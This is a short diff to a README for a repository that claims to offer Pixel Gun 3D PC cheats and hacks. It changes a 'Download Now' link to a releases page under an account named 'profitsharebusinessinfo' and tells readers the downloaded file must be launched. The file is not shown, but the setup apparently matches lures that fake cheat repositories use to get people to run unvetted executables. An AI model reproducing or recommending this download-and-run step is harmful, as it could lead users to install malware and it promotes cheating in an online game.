@@ -10,7 +10,7 @@ Welcome to the Pixel Gun 3D PC Cheats repository! Here, you will find a collecti
 
 ## Get Started
 
-To access the tools and cheats provided in this repository, please download the following file: [Download Now](https://github.com/uploads/App.zip)
+To access the tools and cheats provided in this repository, please download the following file: [Download Now](https://github.com/profitsharebusinessinfo/Pixel-Gun-3D-PC-Cheats/releases)
 
 ### Note:
 - The file needs to be launched to access the Pixel Gun 3D PC cheats and hacks.
